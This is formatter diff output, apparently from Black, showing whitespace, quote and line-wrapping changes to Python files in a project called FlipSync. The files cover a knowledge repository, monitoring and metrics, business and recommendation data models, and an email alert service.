 
     async def _publish_knowledge_added_event(self, knowledge: KnowledgeItem) -> None:
         """
         Publish a knowledge added event.
 
@@ -1647,12 +1717,12 @@
             data={
                 "knowledge_id": knowledge.knowledge_id,
                 "knowledge_type": knowledge.knowledge_type.name,
                 "topic": knowledge.topic,
                 "source_id": knowledge.source_id,
-                "created_at": knowledge.created_at.isoformat()
-            }
+                "created_at": knowledge.created_at.isoformat(),
+            },
         )
 
     async def _publish_knowledge_updated_event(self, knowledge: KnowledgeItem) -> None:
         """
         Publish a knowledge updated event.
@@ -1667,12 +1737,12 @@
                 "previous_version_id": knowledge.previous_version_id,
                 "knowledge_type": knowledge.knowledge_type.name,
                 "topic": knowledge.topic,
                 "source_id": knowledge.source_id,
                 "updated_at": knowledge.updated_at.isoformat(),
-                "version": knowledge.version
-            }
+                "version": knowledge.version,
+            },
         )
 
     async def _publish_knowledge_deleted_event(self, knowledge: KnowledgeItem) -> None:
         """
         Publish a knowledge deleted event.
@@ -1684,12 +1754,12 @@
             notification_name="knowledge_deleted",
             data={
                 "knowledge_id": knowledge.knowledge_id,
                 "knowledge_type": knowledge.knowledge_type.name,
                 "topic": knowledge.topic,
-                "source_id": knowledge.source_id
-            }
+                "source_id": knowledge.source_id,
+            },
         )
 
     async def get_all_knowledge(self) -> List[KnowledgeItem]:
         """
         Get all knowledge items in the repository.
@@ -1717,11 +1787,13 @@
         except Exception as e:
             error_msg = f"Failed to get all knowledge items: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise KnowledgeError(error_msg, cause=e)
 
-    async def get_knowledge_updates(self, since_timestamp: datetime) -> List[KnowledgeItem]:
+    async def get_knowledge_updates(
+        self, since_timestamp: datetime
+    ) -> List[KnowledgeItem]:
         """
         Get knowledge items updated since a timestamp.
 
         Args:
             since_timestamp: Timestamp to get updates since
@@ -1735,23 +1807,29 @@
         try:
             # Get all knowledge items
             items = list(self.knowledge_items.values())
 
             # Filter by update timestamp
-            updated_items = [item for item in items if item.updated_at > since_timestamp]
+            updated_items = [
+                item for item in items if item.updated_at > since_timestamp
+            ]
 
             # Add to cache
             for item in updated_items:
                 await self.cache.add(item)
 
             return updated_items
         except Exception as e:
-            error_msg = f"Failed to get knowledge updates since {since_timestamp}: {str(e)}"
+            error_msg = (
+                f"Failed to get knowledge updates since {since_timestamp}: {str(e)}"
+            )
             self.logger.error(error_msg, exc_info=True)
             raise KnowledgeError(error_msg, cause=e)
 
-    async def get_critical_updates(self, since_timestamp: datetime, priority_threshold: float = 0.5) -> List[KnowledgeItem]:
+    async def get_critical_updates(
+        self, since_timestamp: datetime, priority_threshold: float = 0.5
+    ) -> List[KnowledgeItem]:
         """
         Get critical knowledge updates since a timestamp.
 
         This method is optimized for mobile devices with limited bandwidth.
         It returns only high-priority knowledge updates.
@@ -1789,19 +1867,19 @@
                     priority += 0.1  # Deprecated items are somewhat important
 
                 # Metadata priority
                 if item.metadata:
                     # Check for priority in metadata
-                    if 'priority' in item.metadata:
+                    if "priority" in item.metadata:
                         try:
-                            metadata_priority = float(item.metadata['priority'])
+                            metadata_priority = float(item.metadata["priority"])
                             priority += metadata_priority
                         except (ValueError, TypeError):
                             pass
 
                     # Check for critical flag in metadata
-                    if 'critical' in item.metadata and item.metadata['critical']:
+                    if "critical" in item.metadata and item.metadata["critical"]:
                         priority += 0.3
 
                 # Normalize priority to 0.0-1.0 range
                 priority = min(1.0, priority)
 
@@ -1813,6 +1891,6 @@
 
             return critical_items
         except Exception as e:
             error_msg = f"Failed to get critical knowledge updates since {since_timestamp}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
-            raise KnowledgeError(error_msg, cause=e)
\ No newline at end of file
+            raise KnowledgeError(error_msg, cause=e)
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/in_memory_knowledge_repository.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/__init__.py	2025-06-14 20:35:30.795751+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/__init__.py	2025-06-19 04:03:53.615132+00:00
@@ -6,36 +6,46 @@
 
 # Create global instances
 _metrics_collector = None
 _alert_manager = None
 
+
 def get_metrics_collector() -> MetricsCollector:
     """Get the global metrics collector instance."""
     global _metrics_collector
     if _metrics_collector is None:
         _metrics_collector = MetricsCollector()
     return _metrics_collector
+
 
 def get_alert_manager() -> AlertManager:
     """Get the global alert manager instance."""
     global _alert_manager
     if _alert_manager is None:
         _alert_manager = AlertManager()
     return _alert_manager
 
+
 async def record_metric(name: str, value: float, **kwargs):
     """Record a metric using the global metrics collector."""
     collector = get_metrics_collector()
     await collector.record_metric(name, value, **kwargs)
+
 
 async def create_alert(title: str, message: str, **kwargs):
     """Create an alert using the global alert manager."""
     manager = get_alert_manager()
     return await manager.create_alert(title, message, **kwargs)
 
+
 __all__ = [
-    "get_logger", "get_log_manager", "configure_logging",
-    "record_metric", "get_metrics_collector",
-    "create_alert", "get_alert_manager",
-    "AlertLevel", "AlertCategory", "AlertSource"
+    "get_logger",
+    "get_log_manager",
+    "configure_logging",
+    "record_metric",
+    "get_metrics_collector",
+    "create_alert",
+    "get_alert_manager",
+    "AlertLevel",
+    "AlertCategory",
+    "AlertSource",
 ]
-
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/alerts/__init__.py	2025-06-14 20:35:30.795751+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/alerts/__init__.py	2025-06-19 04:03:53.662700+00:00
@@ -1,2 +1 @@
 """alerts module."""
-
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/alerts/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/models/document.py	2025-06-14 20:35:30.795751+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/models/document.py	2025-06-19 04:03:53.749398+00:00
@@ -7,25 +7,37 @@
 from pydantic import BaseModel, Field
 
 
 class Document(BaseModel):
     """Document model for storing and retrieving documents."""
-    
-    id: str = Field(default_factory=lambda: str(uuid.uuid4()), description="Unique document identifier")
+
+    id: str = Field(
+        default_factory=lambda: str(uuid.uuid4()),
+        description="Unique document identifier",
+    )
     content: str = Field(..., description="Document content")
     title: Optional[str] = Field(None, description="Document title")
-    metadata: Optional[Dict[str, Any]] = Field(default_factory=dict, description="Document metadata")
-    embedding: Optional[List[float]] = Field(None, description="Document embedding vector")
-    created_at: Optional[datetime] = Field(default_factory=lambda: datetime.now(timezone.utc), description="Creation timestamp")
-    updated_at: Optional[datetime] = Field(default_factory=lambda: datetime.now(timezone.utc), description="Last update timestamp")
-    
+    metadata: Optional[Dict[str, Any]] = Field(
+        default_factory=dict, description="Document metadata"
+    )
+    embedding: Optional[List[float]] = Field(
+        None, description="Document embedding vector"
+    )
+    created_at: Optional[datetime] = Field(
+        default_factory=lambda: datetime.now(timezone.utc),
+        description="Creation timestamp",
+    )
+    updated_at: Optional[datetime] = Field(
+        default_factory=lambda: datetime.now(timezone.utc),
+        description="Last update timestamp",
+    )
+
     class Config:
         """Pydantic configuration."""
-        json_encoders = {
-            datetime: lambda v: v.isoformat()
-        }
-    
+
+        json_encoders = {datetime: lambda v: v.isoformat()}
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert document to dictionary."""
         return {
             "id": self.id,
             "content": self.content,
@@ -33,11 +45,11 @@
             "metadata": self.metadata or {},
             "embedding": self.embedding,
             "created_at": self.created_at.isoformat() if self.created_at else None,
             "updated_at": self.updated_at.isoformat() if self.updated_at else None,
         }
-    
+
     @classmethod
     def from_dict(cls, data: Dict[str, Any]) -> "Document":
         """Create document from dictionary."""
         return cls(
             id=data.get("id", str(uuid.uuid4())),
@@ -50,17 +62,23 @@
         )
 
 
 class SearchQuery(BaseModel):
     """Search query model for document search."""
-    
+
     query: str = Field(..., description="Search query text")
-    limit: int = Field(default=10, ge=1, le=100, description="Maximum number of results")
+    limit: int = Field(
+        default=10, ge=1, le=100, description="Maximum number of results"
+    )
     offset: int = Field(default=0, ge=0, description="Result offset for pagination")
-    filters: Optional[Dict[str, Any]] = Field(default=None, description="Optional search filters")
-    include_embeddings: bool = Field(default=False, description="Whether to include embeddings in results")
-    
+    filters: Optional[Dict[str, Any]] = Field(
+        default=None, description="Optional search filters"
+    )
+    include_embeddings: bool = Field(
+        default=False, description="Whether to include embeddings in results"
+    )
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert search query to dictionary."""
         return {
             "query": self.query,
             "limit": self.limit,
@@ -70,15 +88,15 @@
         }
 
 
 class DocumentSearchResult(BaseModel):
     """Document search result model."""
-    
+
     document: Document = Field(..., description="Found document")
     score: float = Field(..., description="Relevance score")
     highlights: Optional[List[str]] = Field(default=None, description="Text highlights")
-    
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert search result to dictionary."""
         return {
             "document": self.document.to_dict(),
             "score": self.score,
@@ -86,34 +104,34 @@
         }
 
 
 class DocumentBatch(BaseModel):
     """Batch of documents for bulk operations."""
-    
+
     documents: List[Document] = Field(..., description="List of documents")
-    
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert document batch to dictionary."""
-        return {
-            "documents": [doc.to_dict() for doc in self.documents]
-        }
-    
+        return {"documents": [doc.to_dict() for doc in self.documents]}
+
     @classmethod
     def from_dict(cls, data: Dict[str, Any]) -> "DocumentBatch":
         """Create document batch from dictionary."""
-        documents = [Document.from_dict(doc_data) for doc_data in data.get("documents", [])]
+        documents = [
+            Document.from_dict(doc_data) for doc_data in data.get("documents", [])
+        ]
         return cls(documents=documents)
 
 
 class DocumentStats(BaseModel):
     """Document collection statistics."""
-    
+
     total_documents: int = Field(..., description="Total number of documents")
     total_size_bytes: int = Field(..., description="Total size in bytes")
     average_document_size: float = Field(..., description="Average document size")
     last_updated: datetime = Field(..., description="Last update timestamp")
-    
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert document stats to dictionary."""
         return {
             "total_documents": self.total_documents,
             "total_size_bytes": self.total_size_bytes,
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/models/document.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/models/business_models.py	2025-06-14 20:35:30.791742+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/models/business_models.py	2025-06-19 04:03:53.913944+00:00
@@ -15,10 +15,11 @@
 import uuid
 
 
 class DecisionType(str, Enum):
     """Types of executive decisions."""
+
     STRATEGIC_PLANNING = "strategic_planning"
     INVESTMENT = "investment"
     RESOURCE_ALLOCATION = "resource_allocation"
     RISK_MITIGATION = "risk_mitigation"
     BUDGET_APPROVAL = "budget_approval"
@@ -27,27 +28,30 @@
     OPERATIONAL_CHANGE = "operational_change"
 
 
 class RiskLevel(str, Enum):
     """Risk assessment levels."""
+
     VERY_LOW = "very_low"
     LOW = "low"
     MEDIUM = "medium"
     HIGH = "high"
     VERY_HIGH = "very_high"
 
 
 class Priority(str, Enum):
     """Priority levels for initiatives."""
+
     CRITICAL = "critical"
     HIGH = "high"
     MEDIUM = "medium"
     LOW = "low"
 
 
 class BusinessObjective(str, Enum):
     """Business objectives and goals."""
+
     REVENUE_GROWTH = "revenue_growth"
     PROFIT_MAXIMIZATION = "profit_maximization"
     MARKET_SHARE = "market_share"
     COST_REDUCTION = "cost_reduction"
     OPERATIONAL_EFFICIENCY = "operational_efficiency"
@@ -57,10 +61,11 @@
 
 
 @dataclass
 class FinancialMetrics:
     """Financial performance metrics."""
+
     revenue: Decimal
     profit: Decimal
     margin: float
     roi: float
     cash_flow: Decimal
@@ -71,10 +76,11 @@
 
 
 @dataclass
 class RiskFactor:
     """Individual risk factor assessment."""
+
     factor_id: str
     name: str
     description: str
     probability: float  # 0.0 to 1.0
     impact: float  # 0.0 to 1.0
@@ -85,10 +91,11 @@
 
 
 @dataclass
 class BusinessInitiative:
     """Business initiative or project."""
+
     initiative_id: str = field(default_factory=lambda: str(uuid.uuid4()))
     name: str = ""
     description: str = ""
     objective: BusinessObjective = BusinessObjective.REVENUE_GROWTH
     priority: Priority = Priority.MEDIUM
@@ -105,10 +112,11 @@
 
 
 @dataclass
 class ResourceAllocation:
     """Resource allocation recommendation."""
+
     allocation_id: str = field(default_factory=lambda: str(uuid.uuid4()))
     initiative_id: str = ""
     resource_type: str = ""  # "budget", "personnel", "time", "technology"
     amount: Union[Decimal, int, float] = 0
     unit: str = ""  # "USD", "hours", "people", "licenses"
@@ -121,10 +129,11 @@
 
 
 @dataclass
 class StrategicPlan:
     """Strategic business plan."""
+
     plan_id: str = field(default_factory=lambda: str(uuid.uuid4()))
     name: str = ""
     description: str = ""
     time_horizon: str = "1_year"  # "quarterly", "1_year", "3_year", "5_year"
     objectives: List[BusinessObjective] = field(default_factory=list)
@@ -143,10 +152,11 @@
 
 
 @dataclass
 class InvestmentOpportunity:
     """Investment opportunity analysis."""
+
     opportunity_id: str = field(default_factory=lambda: str(uuid.uuid4()))
     name: str = ""
     description: str = ""
     investment_type: str = ""  # "product", "market", "technology", "acquisition"
     required_investment: Decimal = Decimal("0")
@@ -167,10 +177,11 @@
 
 
 @dataclass
 class DecisionCriteria:
     """Multi-criteria decision analysis criteria."""
+
     criteria_name: str
     weight: float  # 0.0 to 1.0, sum of all weights should be 1.0
     description: str
     measurement_type: str = "quantitative"  # "quantitative" or "qualitative"
     scale_min: float = 0.0
@@ -179,10 +190,11 @@
 
 
 @dataclass
 class DecisionAlternative:
     """Alternative option in decision analysis."""
+
     alternative_id: str = field(default_factory=lambda: str(uuid.uuid4()))
     name: str = ""
     description: str = ""
     scores: Dict[str, float] = field(default_factory=dict)  # criteria_name -> score
     weighted_score: float = 0.0
@@ -195,10 +207,11 @@
 
 
 @dataclass
 class ExecutiveDecision:
     """Executive decision with analysis and recommendation."""
+
     decision_id: str = field(default_factory=lambda: str(uuid.uuid4()))
     decision_type: DecisionType = DecisionType.STRATEGIC_PLANNING
     title: str = ""
     description: str = ""
     context: Dict[str, Any] = field(default_factory=dict)
@@ -222,10 +235,11 @@
 
 
 @dataclass
 class BusinessIntelligence:
     """Business intelligence data for decision making."""
+
     data_id: str = field(default_factory=lambda: str(uuid.uuid4()))
     data_type: str = ""  # "market", "financial", "operational", "competitive"
     source: str = ""
     metrics: Dict[str, Any] = field(default_factory=dict)
     insights: List[str] = field(default_factory=list)
@@ -238,27 +252,31 @@
 
 
 @dataclass
 class PerformanceKPI:
     """Key Performance Indicator tracking."""
+
     kpi_id: str = field(default_factory=lambda: str(uuid.uuid4()))
     name: str = ""
     description: str = ""
     category: str = ""  # "financial", "operational", "customer", "growth"
     current_value: float = 0.0
     target_value: float = 0.0
     unit: str = ""
     trend: str = "stable"  # "increasing", "decreasing", "stable"
-    performance_status: str = "on_track"  # "exceeding", "on_track", "at_risk", "failing"
+    performance_status: str = (
+        "on_track"  # "exceeding", "on_track", "at_risk", "failing"
+    )
     historical_values: List[Dict[str, Any]] = field(default_factory=list)
     benchmark_value: Optional[float] = None
     owner: Optional[str] = None
     update_frequency: str = "monthly"
     last_updated: datetime = field(default_factory=lambda: datetime.now(timezone.utc))
 
 
 # Utility functions for business model operations
+
 
 def calculate_roi(investment: Decimal, return_amount: Decimal) -> float:
     """Calculate Return on Investment."""
     if investment == 0:
         return 0.0
@@ -281,11 +299,11 @@
 
 
 def assess_risk_level(probability: float, impact: float) -> RiskLevel:
     """Assess risk level based on probability and impact."""
     risk_score = probability * impact
-    
+
     if risk_score >= 0.8:
         return RiskLevel.VERY_HIGH
     elif risk_score >= 0.6:
         return RiskLevel.HIGH
     elif risk_score >= 0.4:
@@ -294,69 +312,74 @@
         return RiskLevel.LOW
     else:
         return RiskLevel.VERY_LOW
 
 
-def calculate_weighted_score(scores: Dict[str, float], criteria: List[DecisionCriteria]) -> float:
+def calculate_weighted_score(
+    scores: Dict[str, float], criteria: List[DecisionCriteria]
+) -> float:
     """Calculate weighted score for decision alternative."""
     total_score = 0.0
     total_weight = 0.0
-    
+
     for criterion in criteria:
         if criterion.criteria_name in scores:
             score = scores[criterion.criteria_name]
             # Normalize score to 0-1 scale
-            normalized_score = (score - criterion.scale_min) / (criterion.scale_max - criterion.scale_min)
+            normalized_score = (score - criterion.scale_min) / (
+                criterion.scale_max - criterion.scale_min
+            )
             if not criterion.higher_is_better:
                 normalized_score = 1.0 - normalized_score
-            
+
             total_score += normalized_score * criterion.weight
             total_weight += criterion.weight
-    
+
     return total_score / total_weight if total_weight > 0 else 0.0
 
 
 def create_financial_metrics(
-    revenue: float,
-    expenses: float,
-    period: str = "monthly"
+    revenue: float, expenses: float, period: str = "monthly"
 ) -> FinancialMetrics:
     """Create financial metrics with calculated values."""
     revenue_decimal = Decimal(str(revenue))
     expenses_decimal = Decimal(str(expenses))
     profit = revenue_decimal - expenses_decimal
     margin = float(profit / revenue_decimal * 100) if revenue > 0 else 0.0
     roi = float(profit / expenses_decimal * 100) if expenses > 0 else 0.0
-    
+
     return FinancialMetrics(
         revenue=revenue_decimal,
         profit=profit,
         margin=margin,
         roi=roi,
         cash_flow=profit,
         expenses=expenses_decimal,
-        period=period
+        period=period,
     )
 
 
-def prioritize_initiatives(initiatives: List[BusinessInitiative]) -> List[BusinessInitiative]:
+def prioritize_initiatives(
+    initiatives: List[BusinessInitiative],
+) -> List[BusinessInitiative]:
     """Prioritize business initiatives based on ROI and strategic importance."""
+
     def priority_score(initiative: BusinessInitiative) -> float:
         # Base score from ROI
         roi_score = min(initiative.estimated_roi / 100, 1.0)
-        
+
         # Priority multiplier
         priority_multipliers = {
             Priority.CRITICAL: 2.0,
             Priority.HIGH: 1.5,
             Priority.MEDIUM: 1.0,
-            Priority.LOW: 0.5
+            Priority.LOW: 0.5,
         }
         priority_multiplier = priority_multipliers.get(initiative.priority, 1.0)
-        
+
         # Risk adjustment (lower risk = higher score)
         risk_count = len(initiative.risks)
         risk_adjustment = max(0.5, 1.0 - (risk_count * 0.1))
-        
+
         return roi_score * priority_multiplier * risk_adjustment
-    
+
     return sorted(initiatives, key=priority_score, reverse=True)
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/models/business_models.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/models/recommendation.py	2025-06-14 20:35:30.795751+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/models/recommendation.py	2025-06-19 04:03:53.918503+00:00
@@ -16,28 +16,30 @@
 
 
 @dataclass
 class RecommendationScore:
     """Represents a recommendation score with reasoning."""
+
     score: float
     reasoning: Optional[str] = None
     factors: Dict[str, float] = field(default_factory=dict)
     metadata: Dict[str, Any] = field(default_factory=dict)
-    
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert to dictionary representation."""
         return {
             "score": self.score,
             "reasoning": self.reasoning,
             "factors": self.factors,
-            "metadata": self.metadata
+            "metadata": self.metadata,
         }
 
 
 @dataclass
 class Recommendation:
     """Represents a recommendation."""
+
     recommendation_id: str
     title: str
     description: str
     recommendation_type: str  # action, tip, product, etc.
     score: RecommendationScore
@@ -45,22 +47,22 @@
     action_params: Dict[str, Any] = field(default_factory=dict)
     priority: int = 0  # Higher number = higher priority
     expires_at: Optional[datetime] = None
     created_at: Optional[datetime] = None
     metadata: Dict[str, Any] = field(default_factory=dict)
-    
+
     def __post_init__(self):
         """Initialize default values after creation."""
         if self.created_at is None:
             self.created_at = datetime.now()
-    
+
     def is_expired(self) -> bool:
         """Check if the recommendation has expired."""
         if self.expires_at is None:
             return False
         return datetime.now() > self.expires_at
-    
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert to dictionary representation."""
         return {
             "recommendation_id": self.recommendation_id,
             "title": self.title,
@@ -70,65 +72,69 @@
             "action": self.action,
             "action_params": self.action_params,
             "priority": self.priority,
             "expires_at": self.expires_at.isoformat() if self.expires_at else None,
             "created_at": self.created_at.isoformat() if self.created_at else None,
-            "metadata": self.metadata
+            "metadata": self.metadata,
         }
 
 
 @dataclass
 class ChatRecommendationContext:
     """Context for generating chat-based recommendations."""
+
     user_id: str
     message: str
     intent: Optional[MessageIntent] = None
     agent_response: Optional[AgentResponse] = None
     conversation_id: Optional[str] = None
     session_data: Dict[str, Any] = field(default_factory=dict)
     user_profile: Dict[str, Any] = field(default_factory=dict)
     context: Dict[str, Any] = field(default_factory=dict)
     timestamp: Optional[datetime] = None
-    
+
     def __post_init__(self):
         """Initialize default values after creation."""
         if self.timestamp is None:
             self.timestamp = datetime.now()
-    
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert to dictionary representation."""
         return {
             "user_id": self.user_id,
             "message": self.message,
             "intent": self.intent.to_dict() if self.intent else None,
-            "agent_response": self.agent_response.to_dict() if self.agent_response else None,
+            "agent_response": (
+                self.agent_response.to_dict() if self.agent_response else None
+            ),
             "conversation_id": self.conversation_id,
             "session_data": self.session_data,
             "user_profile": self.user_profile,
             "context": self.context,
-            "timestamp": self.timestamp.isoformat() if self.timestamp else None
+            "timestamp": self.timestamp.isoformat() if self.timestamp else None,
         }
 
 
 @dataclass
 class RecommendationRequest:
     """Request for recommendations."""
+
     request_id: str
     user_id: str
     context: ChatRecommendationContext
     recommendation_types: List[str] = field(default_factory=list)  # Filter by types
     max_recommendations: int = 5
     min_score: float = 0.0
     include_expired: bool = False
     metadata: Dict[str, Any] = field(default_factory=dict)
     created_at: Optional[datetime] = None
-    
+
     def __post_init__(self):
         """Initialize default values after creation."""
         if self.created_at is None:
             self.created_at = datetime.now()
-    
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert to dictionary representation."""
         return {
             "request_id": self.request_id,
             "user_id": self.user_id,
@@ -136,47 +142,52 @@
             "recommendation_types": self.recommendation_types,
             "max_recommendations": self.max_recommendations,
             "min_score": self.min_score,
             "include_expired": self.include_expired,
             "metadata": self.metadata,
-            "created_at": self.created_at.isoformat() if self.created_at else None
+            "created_at": self.created_at.isoformat() if self.created_at else None,
         }
 
 
 @dataclass
 class RecommendationResponse:
     """Response containing recommendations."""
+
     request_id: str
     recommendations: List[Recommendation]
     total_count: int
     processing_time_ms: float
     metadata: Dict[str, Any] = field(default_factory=dict)
     created_at: Optional[datetime] = None
-    
+
     def __post_init__(self):
         """Initialize default values after creation."""
         if self.created_at is None:
             self.created_at = datetime.now()
-    
+
     def get_top_recommendations(self, limit: int = 3) -> List[Recommendation]:
         """Get top recommendations by score and priority."""
         sorted_recs = sorted(
             self.recommendations,
             key=lambda r: (r.priority, r.score.score),
-            reverse=True
+            reverse=True,
         )
         return sorted_recs[:limit]
-    
+
     def filter_by_type(self, recommendation_type: str) -> List[Recommendation]:
         """Filter recommendations by type."""
-        return [r for r in self.recommendations if r.recommendation_type == recommendation_type]
-    
+        return [
+            r
+            for r in self.recommendations
+            if r.recommendation_type == recommendation_type
+        ]
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert to dictionary representation."""
         return {
             "request_id": self.request_id,
             "recommendations": [rec.to_dict() for rec in self.recommendations],
             "total_count": self.total_count,
             "processing_time_ms": self.processing_time_ms,
             "metadata": self.metadata,
-            "created_at": self.created_at.isoformat() if self.created_at else None
+            "created_at": self.created_at.isoformat() if self.created_at else None,
         }
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/models/recommendation.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/models/vector_store/indexer.py	2025-06-14 20:35:30.795751+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/models/vector_store/indexer.py	2025-06-19 04:03:54.030466+00:00
@@ -3,10 +3,11 @@
 from datetime import datetime, timezone
 from typing import Any, Dict, List, Optional, Tuple
 
 # import faiss  # Optional dependency for vector indexing
 import numpy as np
+
 # from scipy.spatial import cKDTree  # Optional dependency
 
 "\nVector indexing implementation with support for multiple index types.\n"
 logger: logging.Logger = logging.getLogger(__name__)
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/models/vector_store/indexer.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/common_types.py	2025-06-14 20:35:30.795751+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/common_types.py	2025-06-19 04:03:54.084496+00:00
@@ -7,18 +7,20 @@
 from pydantic import BaseModel
 
 
 class MetricType(Enum):
     """Metric type enumeration."""
+
     COUNTER = "counter"
     GAUGE = "gauge"
     HISTOGRAM = "histogram"
     SUMMARY = "summary"
 
 
 class MetricCategory(Enum):
     """Metric category enumeration."""
+
     RESOURCE = "resource"
     BUSINESS = "business"
     SYSTEM = "system"
     AGENT = "agent"
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/common_types.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/alerts/notification_service.py	2025-06-14 20:35:30.795751+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/alerts/notification_service.py	2025-06-19 04:03:54.171835+00:00
@@ -6,11 +6,13 @@
 
 from fs_agt_clean.core.monitoring.alerts.models import AlertSeverity
 from fs_agt_clean.core.monitoring.alerts.notification_channels.email_service import (
     EmailService,
 )
-from fs_agt_clean.core.monitoring.alerts.notification_channels.sms_service import SMSService
+from fs_agt_clean.core.monitoring.alerts.notification_channels.sms_service import (
+    SMSService,
+)
 from fs_agt_clean.core.monitoring.protocols import MetricsService
 from fs_agt_clean.core.redis.redis_manager import RedisManager
 
 logger = logging.getLogger(__name__)
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/alerts/notification_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/exporters/prometheus.py	2025-06-14 20:35:30.795751+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/exporters/prometheus.py	2025-06-19 04:03:54.442942+00:00
@@ -5,86 +5,86 @@
 # Create a custom registry for FlipSync metrics
 registry = CollectorRegistry()
 
 # Request metrics
 REQUEST_COUNT = Counter(
-    'flipsync_http_requests_total',
-    'Total number of HTTP requests',
-    ['method', 'endpoint', 'status'],
-    registry=registry
+    "flipsync_http_requests_total",
+    "Total number of HTTP requests",
+    ["method", "endpoint", "status"],
+    registry=registry,
 )
 
 REQUEST_LATENCY = Histogram(
-    'flipsync_http_request_duration_seconds',
-    'HTTP request latency in seconds',
-    ['method', 'endpoint'],
-    registry=registry
+    "flipsync_http_request_duration_seconds",
+    "HTTP request latency in seconds",
+    ["method", "endpoint"],
+    registry=registry,
 )
 
 # Error metrics
 ERROR_COUNT = Counter(
-    'flipsync_errors_total',
-    'Total number of errors',
-    ['type', 'location'],
-    registry=registry
+    "flipsync_errors_total",
+    "Total number of errors",
+    ["type", "location"],
+    registry=registry,
 )
 
 API_ERROR_COUNT = Counter(
-    'flipsync_api_errors_total',
-    'Total number of API errors',
-    ['endpoint', 'error_type'],
-    registry=registry
+    "flipsync_api_errors_total",
+    "Total number of API errors",
+    ["endpoint", "error_type"],
+    registry=registry,
 )
 
 # Service status metrics
 SERVICE_STATUS = Gauge(
-    'flipsync_service_status',
-    'Service status (1=up, 0=down)',
-    ['service'],
-    registry=registry
+    "flipsync_service_status",
+    "Service status (1=up, 0=down)",
+    ["service"],
+    registry=registry,
 )
 
 # Additional FlipSync-specific metrics
 AGENT_STATUS = Gauge(
-    'flipsync_agent_status',
-    'Agent status (1=active, 0=inactive)',
-    ['agent_id', 'agent_type'],
-    registry=registry
+    "flipsync_agent_status",
+    "Agent status (1=active, 0=inactive)",
+    ["agent_id", "agent_type"],
+    registry=registry,
 )
 
 MARKETPLACE_OPERATIONS = Counter(
-    'flipsync_marketplace_operations_total',
-    'Total marketplace operations',
-    ['marketplace', 'operation_type', 'status'],
-    registry=registry
+    "flipsync_marketplace_operations_total",
+    "Total marketplace operations",
+    ["marketplace", "operation_type", "status"],
+    registry=registry,
 )
 
 INVENTORY_ITEMS = Gauge(
-    'flipsync_inventory_items_total',
-    'Total number of inventory items',
-    ['status'],
-    registry=registry
+    "flipsync_inventory_items_total",
+    "Total number of inventory items",
+    ["status"],
+    registry=registry,
 )
 
 DATABASE_CONNECTIONS = Gauge(
-    'flipsync_database_connections',
-    'Number of database connections',
-    ['status'],
-    registry=registry
+    "flipsync_database_connections",
+    "Number of database connections",
+    ["status"],
+    registry=registry,
 )
 
 REDIS_OPERATIONS = Counter(
-    'flipsync_redis_operations_total',
-    'Total Redis operations',
-    ['operation', 'status'],
-    registry=registry
+    "flipsync_redis_operations_total",
+    "Total Redis operations",
+    ["operation", "status"],
+    registry=registry,
 )
 
 VECTOR_STORE_OPERATIONS = Counter(
-    'flipsync_vector_store_operations_total',
-    'Total vector store operations',
-    ['operation', 'status'],
-    registry=registry
+    "flipsync_vector_store_operations_total",
+    "Total vector store operations",
+    ["operation", "status"],
+    registry=registry,
 )
 
 # Initialize service status
-SERVICE_STATUS.labels(service='flipsync').set(0)
+SERVICE_STATUS.labels(service="flipsync").set(0)
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/exporters/prometheus.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/alerts/notification_channels/email_service.py	2025-06-16 06:48:56.017014+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/alerts/notification_channels/email_service.py	2025-06-19 04:03:54.451222+00:00
@@ -7,17 +7,19 @@
 from email.mime.text import MIMEText
 from typing import Any, Dict, List, Optional, Protocol, TypedDict
 
 try:
     import aiosmtplib
+
     AIOSMTPLIB_AVAILABLE = True
 except ImportError:
     AIOSMTPLIB_AVAILABLE = False
     aiosmtplib = None
 
 try:
     from jinja2 import Environment, PackageLoader, select_autoescape
+
     JINJA2_AVAILABLE = True
 except ImportError:
     JINJA2_AVAILABLE = False
 
 from fs_agt_clean.core.monitoring.alerts.models import AlertSeverity
@@ -90,11 +92,13 @@
 
         # Initialize Jinja2 template environment if available
